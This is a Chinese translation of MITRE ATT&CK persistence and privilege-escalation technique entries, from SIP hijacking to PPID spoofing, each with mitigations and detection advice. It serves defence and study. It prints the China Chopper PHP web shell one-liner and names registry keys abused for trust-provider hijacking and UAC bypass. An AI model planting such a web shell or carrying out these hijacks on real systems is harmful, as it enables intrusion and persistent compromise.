**用户帐号管理**|将可以在 Windows 中创建符号链接的用户的权限限制到适当的组，如 Administrators 和虚拟化所需的组。 这可以通过 GPO 完成： 计算机配置>策略 > Windows 设置>安全设置>本地策略>用户权限分配： 创建符号链接

#### 检测手段

由于快捷方式的目标路径一般不会改变，因此与已知软件更改，补丁、删除无关的快捷方式文件的修改可能是可疑的。 分析时应尝试将快捷文件更改或事件创建与基于已知攻击者行为的其他潜在可疑事件相关联，例如进行网络连接的未知可执行文件的进程启动。

***

### SIP and Trust Provider Hijacking (SIP和信任提供者劫持)

>[原文链接](http://vulhub.org.cn/attack/techniques/T1198.md)

在用户模式下，Windows Authenticode 数字签名用于验证文件的来源和完整性，这些变量可用于建立对签名代码的信任  (例如：可以将具有有效Microsoft签名的驱动程序视为安全的) 。签名验证过程是通过WinVerifyTrust应用程序编程接口  (API) 函数处理的，该函数 接受查询并与负责验证签名参数的适当信任提供者进行协调。

由于可执行文件的类型和相应的签名格式各不相同，Microsoft创建了称为主题接口包  (SIP) 软件组件，以在API函数和文件之间提供抽象层。SIP负责使API函数能够创建，检索，计算和验证签名。大多数文件格式  (可执行文件，PowerShell，安装程序等，都具有唯一的SIP，目录签名提供了一个包罗万象的 ) ，并且由全局唯一标识符  (GUID) 标识。

与 [**代码签名**](#code-signing-%e4%bb%a3%e7%a0%81%e7%ad%be%e5%90%8d-macoswindows) 类似，攻击者可能会滥用此体系结构来破坏信任控制并绕过仅允许在系统上执行经过合法签名的代码的安全策略。攻击者可能劫持SIP和信任提供程序组件，以误导操作系统和白名单工具，从而将恶意  (或任何) 代码分类为：

- 改 `Dll`和 `FuncName` 注册表值在 `HKLM\SOFTWARE[\WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg{{SIP_GUID}}` 此指向动态链接库  (DLL) ，提供SIP的CryptSIPDllGetSignedDataMsg函数，该函数从签名文件中检索编码的数字证书。通过指向带有导出函数的恶意制作的DLL，该函数始终返回已知的良好签名值  (例如：便携式可执行文件的Microsoft签名) ，而不是文件的真实签名，攻击者可以使用该SIP将可接受的签名值应用于所有文件[6]  (尽管散列不匹配可能会发生，从而使签名无效，因为函数返回的散列将与从文件计算出的值不匹配) 
- 修改DLL中的 `Dll` 和 `FuncName `注册表值 `HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData{{SIP_GUID}}`指向提供SIP的CryptSIPDllVerifyIndi​​rectData函数的DLL，该函数根据签名的哈希值验证文件的计算哈希值。通过使用带有始终返回TRUE  (表示验证成功) 的导出函数的恶意制作的DLL，攻击者可以使用该SIP成功地验证任何文件  (带有合法签名)   (无论是否劫持了该文件) 。前面提到的CryptSIPDllGetSignedDataMsg函数) 。也可以将该注册表值从已经存在的DLL重定向到合适的导出函数，从而避免删除和执行磁盘上新文件的要求
- 在那点上修改DLL和Function注册表值 `HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\Providers\Trust\FinalPolicy{{trust provider GUID}}`，以提供提供信任提供程序的FinalPolicy函数的DLL，在该函数中检查已解码和已解析的签名并做出大多数信任决策。与劫持SIP的CryptSIPDllVerifyIndi​​rectData函数类似，可以从已存在的DLL或恶意制作的DLL将该值重定向到合适的导出函数  (尽管信任提供程序的实现很复杂) 
- 注意：在没有通过 [**DLL搜索顺序劫持**](#dll-search-order-hijacking-dll%e6%90%9c%e7%b4%a2%e9%a1%ba%e5%ba%8f%e5%8a%ab%e6%8c%81) 修改注册表的情况下，上述劫持也是可能的

劫持SIP或信任提供程序组件也可以启用持久代码执行，因为这些恶意组件可以由执行代码签名或签名验证的任何应用程序调用。

#### 防御方式

缓解|描述
:--:|:--
**预防执行**|启用白名单解决方案  (例如AppLocker和/或Device Guard) 以阻止恶意SIP DLL的加载
**限制文件和目录权限**|将SIP DLL的存储和执行限制为受保护的目录，例如 `C:\ Windows`，而不是用户目录
**限制注册表权限**|确保为注册表配置单元设置了适当的权限，以防止用户修改与SIP和信任提供程序组件相关的密钥。如果不防止对注册表项进行恶意修改，则组件仍然可以被劫持到磁盘上已经存在的适当功能

#### 检测手段

定期基线注册的SIP和信任提供程序  (注册表项和磁盘上的文件) ，特别是寻找新的，修改的或非Microsoft的项。

启用CryptoAPI v2  (CAPI) 事件日志记录来监视和分析与失败的信任验证有关的错误事件  (事件ID 81，尽管此事件可由劫持的信任提供程序组件所破坏) ，以及任何其他提供的信息事件  (例如：成功的验证) 。代码完整性事件日志记录还可能提供恶意SIP或信任提供者负载的重要指示，因为试图加载恶意制作的信任验证组件的受保护进程可能会失败  (事件ID 3033) 。

利用Sysmon检测规则和/或启用 **高级安全审核** 策略中的 **注册表  (全局对象访问审核) ** 设置，以应用全局系统访问控制列表  (SACL) 和事件审核，以修改与注册表值  (子) 相关的键到SIP和信任提供者:

- `HKLM \ SOFTWARE \ Microsoft \ Cryptography \ OID`
- `HKLM \ SOFTWARE \ WOW6432Node \ Microsoft \ Cryptography \ OID`
- `HKLM \ SOFTWARE \ Microsoft \ Cryptography \ Providers \ Trust`
- `HKLM \ SOFTWARE \ WOW6432Node \ Microsoft \ Cryptography \ Providers \ Trust`
注意：作为此技术的一部分，攻击者可能会尝试手动编辑这些注册表项  (例如：Regedit) 或使用Regsvr32进行合法的注册过程。

分析自动运行数据中的异常和异常，尤其是通过隐藏在自动启动位置中而试图持久执行的恶意文件。默认情况下，自动运行将隐藏由Microsoft或Windows签名的条目，因此请确保同时取消选中 **隐藏Microsoft条目** 和 **隐藏Windows条目** 。

***

### Startup Items (启动项)

>[原文链接](https://attack.mitre.org/techniques/T1165/)

根据Apple的文档，启动项在启动过程的最后阶段执行，并且包含shell脚本或其他可执行文件以及系统用来确定所有启动项的执行顺序的配置信息。从技术上讲，这是一个不推荐使用的版本  (由Launch Daemons取代) ，因此 `/Library/StartupItems` 默认情况下不能保证相应的文件夹存在于系统上，但默认情况下似乎确实存在于macOS Sierra上。启动项是一个目录，其可执行文件和配置属性列表  (plist) `StartupParameters.plist` 位于顶层目录中。

攻击者可以在StartupItems目录中创建适当的文件夹/文件，以注册其自己的持久性机制。此外，由于StartupItems在macOS的启动阶段运行，因此它们将作为root运行。如果攻击者能够修改现有的启动项，那么他们也将能够升级特权。

#### 防御方式

缓解|描述
:--:|:--
**限制文件和目录权限**|由于不赞成使用StartupItems，因此阻止所有用户写入 `/Library/StartupItems` 目录将阻止注册任何启动项
**用户帐号管理**|应该应用适当的权限，以便只有特定用户才能编辑启动项，以便可以利用它们进行提权

#### 检测手段

`/Library/StartupItems`文件夹可以监测其变化。同样，应根据白名单检查从此机制实际执行的程序。监视在启动过程中执行的进程，以检查异常或未知的应用程序和行为。

***

### System Firmware (系统固件)

>[原文链接](https://attack.mitre.org/techniques/T1019/)

系统固件用来作为操作系统和计算机硬件之间的软件接口，示例有 BIOS (基本输入/输出系统) 和统一可扩展固件接口 (UEFI) 或可扩展固件接口 (EFI)

诸如 BIOS 和（U）EFI 之类的系统固件是计算机功能的基础，并且可以由攻击者修改以执行或协助恶意活动。存在覆盖系统固件的能力，这可能为复杂的攻击者提供安装恶意固件更新的手段，作为在可能难以检测的系统上持久化

#### 防御方式

缓解|描述
:--:|:--
**引导完整性**|检查现有BIOS或EFI的完整性，以确定是否容易受到修改。使用可信平台模块技术
**特权账户管理**|防止攻击者访问特权帐户或执行此技术所需的访问
**更新软件**|根据需要修补BIOS和EFI

#### 检测手段

检测系统固件操作。 转储并检查易受攻击系统上的 BIOS 映像，并与已知的良好映像进行比较。 分析差异以确定是否与恶意更改。记录尝试读写 BIOS 的行为，并与已知的补丁进行比较。

同样，可以收集 EFI 模块，并将其与已知干净的 EFI 可执行二进制文件列表进行比较，以检测潜在的恶意模块。 可以使用 CHIPSEC 框架分析以确定固件是否被修改过。

***

### Systemd Service (系统服务)

>[原文链接](https://attack.mitre.org/techniques/T1501/)

系统服务可用于在Linux系统上持久化。systemd服务管理器通常用于管理后台守护进程（也称为服务）和其他系统资源。ystemd是许多Linux发行版中的默认初始化（init）系统，从Debian 8，Ubuntu 15.04，CentOS 7，RHEL 7，Fedora 15开始，它替换了包括SysVinit和Upstart的旧式初始化系统，同时保持了向后兼容，前面提到的初始化系统。

Systemd利用称为服务单元的配置文件来控制服务的启动方式和条件。默认情况下，这些单位文件存储在 `/etc/systemd/system` 和 `/usr/lib/systemd/system` 目录中，文件扩展名为 `.service`。每个服务单元文件可能包含许多可执行系统命令的指令。

- ExecStart，ExecStartPre和ExecStartPost伪指令涵盖了当通过 **systemctl** 手动启动服务时或在将服务设置为自动启动时在系统启动时执行命令的情况
- ExecReload指令涵盖了服务重新启动的时间
- ExecStop和ExecStopPost指令涵盖何时停止服务或由 **systemctl** 手动停止服务

攻击者已使用systemd功能通过创建 **和/或** 修改服务单元文件来建立对受害系统的持久访问，这些服务单元文件使systemd定期（例如在系统启动时）执行恶意命令。

攻击者通常需要root特权才能在/目录中创建/修改服务单元文件，`/etc/systemd/system`而 `/usr/lib/systemd/system` 低特权用户可以在目录中创建/修改服务单元文件，`~/.config/systemd/user/` 以实现用户级的持久性。

#### 防御方式

缓解|描述
:--:|:--
**限制软件安装**|仅将软件安装限制在受信任的存储库中，并注意独立的软件包
**特权账户管理**|systemd服务单元文件的创建和修改通常保留给管理员，例如Linux超级用户和具有超级用户特权的其他用户
**限制文件和目录权限**|将对systemd单元文件的读/写访问限制为仅选择有正当需求来管理系统服务的特权用户
**用户帐号管理**|将用户对系统实用程序（例如 **systemctl** ）的访问权限限制为仅具有合法需要的用户

#### 检测手段

Systemd服务单元文件可以通过审计文件创建和修改事件中被检测到 `/etc/systemd/system`，`/usr/lib/systemd/system/`和目录，以及相关的符号链接。以这种方式产生的可疑进程或脚本将具有 **systemd** 的父进程，其父进程ID为1，通常将以root 用户身份执行。`/home//.config/systemd/user/`

还可以通过将结果与可信系统基准进行比较来识别可疑的系统服务。可以使用systemctl实用工具检查系统范围的服务来检测恶意的系统服务：`systemctl list-units -–type=service –all`。分析.service文件系统上存在的文件的内容，并确保它们引用合法的预期可执行文件。

审核 **systemctl** 实用程序以及诸如之类的相关实用程序的执行和命令行参数 `/usr/sbin/service` 可能会揭示恶意的systemd服务执行。

***

### Time Providers (时间提供程序)

>[原文链接](https://attack.mitre.org/techniques/T1209/)

Windows Time 服务 (W32Time) 支持跨域和域内的时间同步。 W32Time 时间提供程序负责从硬件/网络资源中检索时间戳，并将这些值输出到其他网络客户端。

时间提供程序实现为动态链接库 (DLL)，在 HKEY_LOCAL_MACHINE32Time 的子键中注册。 由服务控制管理器控制的时间提供程序管理器，在系统启动和/或参数更改时加载和启动在此键下列出并已启用的时间提供程序。

攻击者可能会滥用此体系结构来建立持久性，特别是通过注册并启用恶意 DLL 作为时间提供程序。 注册时间提供程序需要管理员权限，不过将在本地服务帐户的上下文中执行。

#### 防御方法

缓解|描述
:--:|:--
**限制文件和目录权限**|考虑使用组策略来配置和阻止对W32Time DLL的添加/修改
**限制注册表权限**|考虑使用组策略在注册表中配置和阻止对W32Time参数的修改

#### 检测手段

为值设置基准并监视/分析与修改注册表中的 W32Time 信息相关的活动，包括应用程序编程接口 (API) 调用，如 RegCreateKeyEx 和 RegSetValueEx，以及 W32tm.exe 的执行。 注册的自定义时间提供程序数量没有限制，但每个可能都需要将 DLL payload 写入磁盘。

Sysinternals Autoruns 工具还可以用于分析自启动位置，包括列出为时间提供程序的 DLL。

***

### Trap

>同 [trap 命令](#trap-trap-%e5%91%bd%e4%bb%a4)

***

### Valid Accounts

>同 [合法账号](#valid-accounts-%e5%90%88%e6%b3%95%e8%b4%a6%e5%8f%b7)

***

### Web Shell (Web Shell)

>[原文链接](https://attack.mitre.org/techniques/T1100/)

Web shell 是可公开访问的 Web 服务器上的 Web 脚本，它使攻击者能够利用 Web 服务器作为进入网络的网关。Web shell 可以提供 Web 服务器系统上的一组可执行函数或命令行界面。除了服务器端脚本之外，Web shell 还可用于与 Web 服务器通信的客户机接口程序（参见，例如，China Chopper Web shell 客户端）。 Web shell 可以作为 [**冗余访问88](#redundant-access-%e5%86%97%e4%bd%99%e8%ae%bf%e9%97%ae) 或 持久化，以防攻击者的主要访问方法被检测到并禁止。

#### 防御方法

缓解|描述
:--:|:--
**特权账户管理**|审计帐户和组权限，确保账户用于管理服务器不与一些内部网络用户的账户和权限重叠，这些用户可以通过凭据访问并用于登录到 Web 服务器和种植 Web shell 或从 Web 服务器转移到内部网络
**更新软件**|确保定期对外部 Web 服务器打补丁，以防止攻击者通过利用漏洞进行访问以获得远程代码访问权，或通过文件包含弱点（可能允许攻击者上传自动作为 Web 页面提供服务的文件或脚本）

#### 检测手段

eb shell 可能难以检测到。 与其他形式的持久性远程访问不同，它们不发起连接。 服务器上的 Web shell 可能很小且看起来无害。 例如，China Chopper Web shell 的 PHP 版本是以下简短的 payload:

`<?php @eval($_POST['password']);>`

然而，存在检测机制。进程监控可用于检测执行可疑操作（如运行 cmd 或访问不在 Web 目录中的文件）的 Web 服务器。 文件监视可用于检测 Web 服务器的 Web 目录中与 Web 服务器内容更新不匹配的文件的更改，并可表明 Web shell 脚本的植入。 记录尝试对服务器进行的身份验证，以及与服务器和内部网络之间的任何异常的通信模式。

***

### Windows Management Instrumentation Event Subscription (Windows 管理规范事件订阅)

>[原文链接](https://attack.mitre.org/techniques/T1084/)

可以使用 Windows 管理规范（WMI）安装在发生定义事件时执行代码的事件过滤器，提供程序，使用程序和绑定程序。­攻击者可以使用 WMI 的功能来订阅事件并在事件发生时执行任意代码，从而在系统上获得持久性。攻击者可能会试图通过编译 WMI 脚本来规避对此技术的检测。可订阅的事件示例有挂钟时间或计算机的正常运行时间。据报道，一些威胁组织使用这种技术来持久化。

#### 防御方式

缓解|描述
:--:|:--
**特权账户管理**|防止管理员和特权帐户的系统之间的凭据重叠
**用户帐号管理**|默认情况下，仅允许管理员使用WMI进行远程连接。限制其他允许连接的用户，或禁止所有用户远程连接到WMI

#### 检测手段

监视 WMI 事件订阅条目，将当前 WMI 事件订阅与每个主机的已知良好订阅进行比较。 诸如 Sysinternals Autoruns 之类的工具也可以用于检测尝试建立持久性导致的 WMI 更改。

***

### Winlogon Helper DLL (Winlogon Helper DLL)

>[原文链接](https://attack.mitre.org/techniques/T1004/)

Winlogon.exe 是一个 Windows 组件，负责登录/注销时的操作以及 Ctrl-Alt-Delete 触发的安全注意序列（SAS）。在 `HKLM\Software[Wow6432Node]Microsoft\Windows NT\CurrentVersion\Winlogon\` 和 `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` 的注册表项用于管理支持 Winlogon 的其他帮助程序和功能。

对这些注册表项的恶意修改可能导致 Winlogon 加载和执行恶意 DLL 和/或可执行文件。确切说，已知以下子项可能容易被滥用：

- Winlogon \ Notify - 指向处理 Winlogon 事件的通知包 DLL
- Winlogon \ Userinit - 指向 userinit.exe，即用户登录时执行的用户初始化程序
- Winlogon \ Shell - 指向 explorer.exe，即用户登录时执行的系统 shell 攻击者可以利用这些特性重复执行恶意代码并持久化

#### 防御方式

缓解|描述
:--:|:--
**预防执行**|通过使用能够审核和/或阻止未知DLL的白名单工具（如AppLocker），识别和阻止可能通过Winlogon帮助程序执行的潜在恶意软件
**用户帐号管理**|限制用户帐户的特权，以便只有授权的管理员才能执行Winlogon帮助程序更改

#### 检测手段

监视与 Winlogon 关联的且与已知软件， 补丁周期等无关的注册表项的更改。Sysinternals Autoruns 等工具也可用于检测可能尝试持久化的系统更改，包括列出当前的 Winlogon 帮助程序值。写入 System32 的且与已知的良性软件或补丁无关的新 DLL 也可能是可疑的。

查找可能由加载恶意 DLL 的进程导致的异常进程行为。不应孤立地看待数据和事件，而应将其视为可能导致其他活动的行为链的一部分，例如为命令与控制创建的网络连接，通过披露技术(Discovery)来了解有关环境的详细信息以及横向移动(Lateral Movement)。

***

## Privilege Escalation (提权)

>[攻击者试图获取更高权限](https://attack.mitre.org/tactics/TA0004/)

提权包含攻击者用来在系统或网络上获取更高级别权限的技术。攻击者通常可以进入和探索具有无特权访问权限的网络，但是需要提升的权限才能实现他们的目标。常见方法是利用系统漏洞，配置错误和漏洞。提升访问权限的示例包括：

- 系统/根级别
- 本地管理员
- 具有类似于管理员访问权限的用户帐户
- 具有访问特定系统或执行特定功能的用户帐户

这些技术通常与持久性技术重叠，因为操作系统功能使攻击者得以持久可以在提升的环境中执行。

***

### Access Token Manipulation (篡改访问令牌)

>[原文链接](https://attack.mitre.org/techniques/T1134/)

Windows使用访问令牌来确定正在运行的进程的所有权。用户可以操纵访问令牌以使正在运行的进程看起来像它属于启动该进程的用户以外的其他人。发生这种情况时，该过程还将采用与新令牌关联的安全性上下文。例如，Microsoft提倡使用访问令牌作为安全性最佳实践。管理员应以标准用户身份登录，但使用内置访问令牌操作命令以管理员权限运行其工具runas。

攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。但是，攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则攻击者可以使用令牌作为该令牌的帐户向远程系统进行身份验证。

攻击者可以通过以下三种方法来利用访问令牌：

- 令牌模拟/盗窃 -攻击者创建一个新的访问令牌，该令牌使用来复制现有令牌 `DuplicateToken(Ex)`。然后可以将该令牌用于ImpersonateLoggedOnUser允许调用线程模拟已登录用户的安全上下文，或者SetThreadToken用于将模拟令牌分配给线程。当目标用户在系统上具有非网络登录会话时，这很有用

- 使用令牌创建流程 -攻击者 `DuplicateToken(Ex)` 使用`CreateProcessWithTokenW` 来创建新的访问令牌，并将其用于创建在模拟用户的安全上下文下运行的新流程。这对于在其他用户的安全上下文下创建新进程很有用

- 制作和模拟令牌 -攻击者具有用户名和密码，但用户未登录到系统。然后，攻击者可以使用该 `LogonUser` 功能为用户创建登录会话。该函数将返回新会话的访问令牌的副本，并且攻击者可以 `SetThreadToken` 用来将令牌分配给线程。

任何标准用户都可以使用 `runas` 命令和Windows API函数来创建模拟令牌。它不需要访问管理员帐户。

Metasploit的Meterpreter有效负载允许任意令牌操作，并使用令牌模拟来提升特权。Cobalt Strike信标有效载荷允许模拟任意令牌，也可以创建令牌。

#### 防御方式

缓解|描述
:--:|:--
**特权账户管理**|限制权限，以便用户和用户组无法创建令牌。仅应为本地系统帐户定义此设置。GPO：计算机配置> [策略] > Windows设置>安全设置>本地策略>用户权限分配：创建令牌对象。还定义谁可以通过GPO为本地和网络服务创建进程级别令牌：计算机配置> [策略] > Windows设置>安全设置>本地策略>用户权限分配：替换进程级别令牌。
**用户帐号管理**|攻击者必须已经在本地系统上具有管理员级别的访问权限，才能充分利用此技术。确保将用户和帐户限制为所需的最少特权

#### 检测手段

如果攻击者使用的是标准shell，则分析人员可以通过审核命令行活动来检测令牌操纵。具体地说，分析人员应寻找该runas命令的使用。Windows默认情况下不启用详细的命令行日志记录。

如果攻击者使用的是直接调用Windows令牌API的有效负载，则分析人员只能通过仔细分析用户网络活动，检查运行的进程以及与其他端点和网络行为的关联来检测令牌操纵。

有效负载可以利用许多Windows API调用来操纵访问令牌（例如 `LogonUser`，`DuplicateTokenEx`和 `ImpersonateLoggedOnUser`）。请参阅参考的Windows API页面以获取更多信息。

查询系统以获取进程和线程令牌信息，并查找不一致之处，例如用户拥有模拟本地SYSTEM帐户的进程。

***

### Accessibility Features

>同 [辅助功能](#accessibility-features-%e8%be%85%e5%8a%a9%e5%8a%9f%e8%83%bd)

***

### AppCert DLLs

>同 [AppCert DLLs](#appcert-dlls-appcert-dlls)

***

### AppInit DLLs

>同 [AppInit Dlls](#appinit-dlls-appinit-dlls)

***

### Application Shimming

>同 [Application Sjimming](#application-shimming-application-shimming)

***

### Bypass User Account Control (UAC绕过)

>[原文链接](https://attack.mitre.org/techniques/T1088/)

Windows 用户帐户控制 (UAC) 使程序可以通过提示用户进行确认来提升权限，从而在管理员权限下执行任务。对用户的影响包括强制拒绝操作，允许用户执行操作（如果用户在本地管理员组中并单击提示符），或允许用户输入管理员密码以完成操作。

如果计算机的 UAC 保护级别设置为最高级别以外的任何级别，则特定 Windows 程序可以提升特权或执行某些提升的 COM 对象，而不会通过 UAC 通知框提示用户。 这方面的一个例子是使用 rundll32.exe 加载特制的 DLL，它加载自动提权的 COM 对象并在受保护的目录中执行文件操作，这通常需要提升访问权限。恶意软件也可以被注入到受信任的进程中，从而在不提示用户的情况下获得更高的权限。如果目标进程不受保护， 攻击者可以使用这些技术将权限提升为管理员。

已发现许多绕过 UAC 的方法。UACMe 的 Github readme 页面包含已在 UACMe 中发现和实施的广泛的方法列表 ，但可能不是全面的绕过列表。经常发现其他的旁路方法，其中一些在民间使用，如：­

- eventvwr.exe 可以自动提权并执行指定的二进制文件或脚本

如果已知具有管理员权限的帐户的凭据，则可以通过横向移动技术进行绕过，因为 UAC 是单系统安全机制，并且在系统上运行的进程的权限或完整性对于横向系统是未知的，默认为高完整性。

#### 防御方式

缓解|描述
:--:|:--
**审计**|检查Windows系统上常见的UAC旁路漏洞，以了解风险状况并在适当的情况下解决问题
**特权账户管理**|从系统上的本地管理员组中删除用户
**用户帐号控制**|尽管存在UAC绕过技术，但仍应谨慎使用UAC的最高执行级别，并减少DLL搜索顺序劫持等技术所存在的绕过机会

#### 检测手段

当用户在系统上的本地管理员组中时，有许多方法可以绕过 UAC，因此很难针对对所有变化进行检测。 应该努力减轻影响并收集有关进程启动和在 UAC 绕过前后的操作的足够信息。 监视进程 API 调用的行为，这些行为可能表明进程注入和通过 DLL 搜索顺序劫持加载的异常 DLL，这表明试图获得对高级特权进程的访问权。 一些 UAC 绕过方法依赖于修改特定的，用户可访问的注册表设置。 例如：

- eventvwr.exe 绕过使用 [HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command 注册表项。

- sdclt.exe 绕过使用 [HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe 和 [HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand 注册表项。

分析人员应该监控这些注册表设置，以发现未经授权的更改。

***

### DLL Search Order Hijacking

> 同 [DLL 搜索顺序劫持](#dll-search-order-hijacking-dll%e6%90%9c%e7%b4%a2%e9%a1%ba%e5%ba%8f%e5%8a%ab%e6%8c%81)

***

### Dylib Hijacking

>同 [Dylib 劫持](#dylib-hijacking-dylib-%e5%8a%ab%e6%8c%81)

***

### Elevated Execution with Prompt (根据提示的高权限执行)

>[原文链接](https://attack.mitre.org/techniques/T1514/)

攻击者可以通过提示用户输入凭据来利用AuthorizationExecuteWithPrivileges API升级特权。此API的目的是为应用程序开发人员提供一种使用root特权执行操作的简便方法，例如用于应用程序安装或更新。此API不会验证请求root特权的程序是否来自信誉良好的源或已被恶意修改。尽管不推荐使用此API，但它仍可在最新版本的macOS中完全发挥作用。调用此API时，将提示用户输入其凭据，但不检查程序的来源或完整性。调用API的程序还可以加载可写的世界文件，可以将其修改为以提升的特权执行恶意行为。

攻击者可能滥用AuthorizationExecuteWithPrivileges以获得root特权，以便在受害者上安装恶意软件并安装持久性机制。该技术可以与伪装(T1036)结合使用，以欺骗用户向恶意代码授予逐步升级的特权。通过修改使用此API的计算机上存在的合法程序，该技术也已显示出可行性

#### 防御方式

缓解|描述
:--:|:--
**预防执行**|系统设置可能会阻止尚未通过Apple Store下载的应用程序运行，这可能有助于缓解其中的某些问题。不允许运行未签名的应用程序也可以减轻一些风险

#### 检测手段

考虑监视 `/usr/libexec/security_authtrampoline` 可能表明正在执行AuthorizationExecuteWithPrivileges的执行。MacOS系统日志还可以指示何时调用AuthorizationExecuteWithPrivileges。监视OS API回调的执行也可以是检测此行为的一种方式，但需要专门的安全工具。

***

### Emond

>同[Emond](#emond-emond)

***

### Exploitation for Privilege Escalation (利用特权升级)

>[原文链接](https://attack.mitre.org/techniques/T1068/)

软件漏洞利用指的是攻击者利用程序，服务或操作系统软件或内核本身中的编程错误来执行攻击者控制的代码。诸如权限级别之类的安全结构通常会阻碍攻击者对信息的访问和某些技术的使用，因此可能需要特权提升以包括使用软件开发，从而绕过这些限制。

最初获取对系统的访问权时，攻击者可能正在一个权限较低的进程中操作，这将阻止他们访问系统上的某些资源。系统可能存在漏洞，通常在一般以更高权限运行的操作系统组件和软件中，可以利用这些漏洞在系统上获得更高级别的访问权限。这可使攻击者从非特权或用户级权限转移到 SYSTEM 或 root 权限，具体取决于易受攻击的组件。对于已经正确配置并限制了其他特权提升方法的终端系统，这可能是攻击者攻击终端系统的必要步骤。

#### 防御方式

缓解|描述
:--:|:--
**应用隔离和沙箱**|通过使用沙箱来利用未发现或未修补的漏洞，使攻击者难以推进其运营。其他类型的虚拟化和应用程序微分段也可以减轻某些类型的利用的影响。这些系统中仍然存在其他利用和弱点的风险
**exp防护**|寻找漏洞利用过程中使用的行为的安全应用程序，例如Windows Defender漏洞防御（WDEG）和增强的缓解经验工具包（EMET），可用于缓解某些漏洞利用行为。控制流完整性检查是另一种潜在地识别和阻止软件攻击发生的方法。这些保护中的许多保护都取决于体系结构和目标应用程序二进制文件的兼容性，可能不适用于针对特权升级的软件组件
**威胁情报**|开发强大的网络威胁情报功能，以确定针对特定组织的软件攻击和 0 day 中可能使用的威胁类型和级别
**更新软件**|使用补丁管理定期更新内部企业终端和服务器的软件

#### 检测手段

检测软件漏洞利用可能很困难，取决于可用的工具。软件漏洞利用可能并不总是成功或可能导致漏洞利用过程不稳定或崩溃。还要在终端系统上查找可能表明成功攻击的行为，例如进程的异常行为。这可能包括写入磁盘的可疑文件、试图隐藏执行的进程注入（Process Injection）证据或披露（Discovery）证据。

通常需要更高的权限来执行其他操作，例如某些凭据转储方法。查找可能表明攻击者获得更高权限的其他活动。

***

### Extra Window Memory Injection (窗口内存注入)

>[原文链接](https://attack.mitre.org/techniques/T1181/)

在创建窗口之前，基于 Windows 的图形化进程必须规定或注册一个窗口类，它规定了外观和行为（通过 Windows 程序，它是处理数据输入/输出的函数）。新窗口类的注册可以包括请求最多 40 个字节的额外窗口内存（EWM），以附加到该类的每个实例的分配的内存中。此 EWM 旨在存储该窗口的特定数据，并具有特定的应用程序编程接口（API）函数来设置和获取其值。

虽然很小，但 EWM 足以存储 32 位指针，通常用于指向 Windows 程序。恶意软件可能在攻击链的一部分中利用此内存位置，包括将代码写入进程内存的共享部分，在 EWM 中放置指向代码的指针，然后通过将执行控制返回到进程的 EWM 中的地址来调用执行。

通过 EWM 注入授权的执行可以在单独的实时进程的地址空间中进行。与进程注入类似，这允许访问目标进程的内存和潜在的高级权限。将 payload 写入共享部分还可以避免使用高度监控的 API 调用，例如 WriteProcessMemory 和 CreateRemoteThread。更复杂的恶意软件样本也可能通过触发 Windows 程序和其他系统功能的组合来绕过保护机制，例如数据执行保护（DEP），这些功能将重写目标进程的可执行部分内的恶意负载。

#### 防御方式

- 这种攻击技术无法通过预防性控制轻松缓解，因为它基于滥用系统功能。

#### 检测手段

监视与枚举和操作 EWM 相关的 API 调用，如 GetWindowLong  和 SetWindowLong 。与此技术相关的恶意软件也使用 SendNotifyMessage 来触发相关的窗口进程和最终的恶意注入.

***

### File System Permissions Weakness

>同[文件系统权限缺陷](#file-system-permissions-weakness-%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f%e6%9d%83%e9%99%90%e7%bc%ba%e5%a4%b1)

***

### Hooking

>同 [Hooking](#hooking-hooking)

***

### Image File Execution Options Injection

>同 [图像文件执行选项注入](#image-file-execution-options-injection-%e5%9b%be%e5%83%8f%e6%96%87%e4%bb%b6%e6%89%a7%e8%a1%8c%e9%80%89%e9%a1%b9%e6%b3%a8%e5%85%a5)

***

### Launch Daemon

>同 [启动守护进程](#launch-daemon-%e5%90%af%e5%8a%a8%e5%ae%88%e6%8a%a4%e8%bf%9b%e7%a8%8b)

***

### New Service

>同 [新建服务](#new-service-%e6%96%b0%e5%bb%ba%e6%9c%8d%e5%8a%a1)

***

### Parent PID Spoofing (PPID欺骗)

>[原文链接](https://attack.mitre.org/techniques/T1502/)

攻击者可能会欺骗新进程的父进程标识符（PPID），以逃避进程监视防御或提升特权。除非明确指定，否则通常直接从其父进程或调用进程中产生新进程。显式分配新进程的PPID的一种方法是通过 `CreateProcessAPI` 调用，该调用支持定义要使用的PPID的参数。 Windows功能（例如，用户帐户控制（UAC））使用此功能来正确设置PPID（由系统（通常通过 `svchost.exe` 或 `consent.exe` ）而不是当前用户上下文生成请求的提升进程后）。

攻击者可能滥用这些机制来逃避防御，如阻塞进程直接从Office文档，并分析产卵针对不同寻常的/潜在的恶意父子进程的关系，如欺骗的PPID 的PowerShell / Rundll32的是`explorer.exe`，而不是交付Office文档作为鱼叉附件的一部分。可以通过恶意Office文档中的VBA 脚本或可以通过API执行执行的任何代码来执行此欺骗。

明确分配PPID还可以启用特权升级（对父进程具有适当的访问权限）。例如，特权用户上下文中的攻击者（即管理员）可以产生一个新进程，并将父进程分配为以SYSTEM（例如）身份运行的进程 `lsass.exe` ，从而通过继承的访问令牌提升新进程。

#### 防御方式

- 这种攻击技术无法通过预防性控制轻松缓解，因为它基于滥用系统功能。

#### 检测手段

查找存储PPID信息的各个字段之间的不一致，例如通过Windows事件跟踪（ETW）收集的数据中的EventHeader ProcessId，Windows事件日志中的Creator Process ID / Name以及ProcessID和ParentProcessID（它们也是从ETW和其他实用程序，例如任务管理器和流程资源管理器）。ETW提供的EventHeader ProcessId标识实际的父进程。

